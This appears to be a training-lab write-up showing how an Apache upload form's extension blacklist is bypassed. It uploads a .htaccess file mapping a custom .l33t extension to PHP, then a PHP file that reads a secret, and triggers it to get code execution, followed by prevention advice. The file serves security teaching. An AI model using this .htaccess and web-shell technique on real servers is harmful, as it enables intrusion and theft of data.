# 🚫➡️💻 Web Shell Upload — Extension Blacklist Bypass via .htaccess Abuse

## 🎯 Objective
- Exploit weak extension blacklist protections to:
  - Bypass forbidden `.php` restrictions
  - Upload malicious server configuration
  - Map arbitrary extensions to executable PHP
  - Deploy web shell
  - Achieve remote code execution

---

## ❗ Why This Matters

- Blacklists are fragile:
  - Easily bypassed
  - Often incomplete
- Apache-specific configuration files can:
  - Override server behavior
  - Create executable extensions
  - Enable arbitrary code execution

---

## 🧪 Exercises Performed

# 🔍 Part 1 — Baseline Upload Restrictions

## 1️⃣ Direct PHP Upload Attempt

### Payload:

```php 
<?php echo file_get_contents('/home/carlos/secret'); ?>
````

---

### Result:

- ❌ `.php` extension blocked

---

### Restriction:

```text 
PHP extension blacklist
```

---

### Security Insight:

```text 
Blacklist focuses only on extension, not execution context
```

---

# 🚀 Part 2 — Server Identification

## 2️⃣ Upload Response Analysis

### Observation:

- ✔️ Apache server detected

---

### Importance:

- ✔️ `.htaccess` supported
- ✔️ mod_php likely enabled

---

## ⚠️ Vulnerability Insight

```text 
Apache configuration files can override blacklist protections
```

---

# 🚀 Part 3 — Upload Malicious .htaccess

## 3️⃣ Multipart Manipulation

### Filename:

```http 
.htaccess
```

---

### Content-Type:

```http
text/plain
```

---

### Payload:

```apache
AddType application/x-httpd-php .l33t
```

---

### Purpose:

- ✔️ Map `.l33t` files to PHP execution

---

### Result:

- ✔️ Upload accepted
- ✔️ Server behavior modified

---

# 🚀 Part 4 — Upload Web Shell with Alternate Extension

## 4️⃣ Rename Payload

### Filename:

```http
exploit.l33t
```

---

### PHP Payload:

```php 
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### Result:

- ✔️ Uploaded successfully
- ✔️ Extension bypassed

---

# 🚀 Part 5 — Trigger Web Shell

## 5️⃣ Access Shell

```http 
GET /files/avatars/exploit.l33t
```

---

### Outcome:

- ✔️ `.htaccess` forces PHP execution
- ✔️ Carlos’s secret returned
- ✔️ Remote code execution achieved
- ✔️ Lab solved 🎉

---

## 🏁 Lab Completion

* Extension blacklist bypassed
* Apache configuration abused
* Custom executable extension created
* PHP shell executed
* Sensitive data extracted

---

## 🧠 Key Takeaways

* Blacklists are weaker than whitelists
* Server config files are high-value targets
* Apache `.htaccess` can completely alter security assumptions
* Extension restrictions alone are insufficient
* Upload functionality must consider configuration abuse

---

## 🔥 Core Vulnerability

```text 
Extension blacklist bypass via malicious .htaccess upload enabled arbitrary PHP execution through custom extension mapping
```

---

## 🛡️ Prevention

* Use:

  * Whitelists
* Block:

  * `.htaccess`
  * Config files
* Disable:

  * Override permissions (`AllowOverride None`)
* Store:

  * Uploads outside web root
* Rename:

  * Uploaded files
* Validate:

  * True file type

---

## ⚠️ Security Principle

```text 
If attackers can upload server configuration, they can redefine your defenses
```

---

## 🏁 Status

- ✔️ Lab Completed
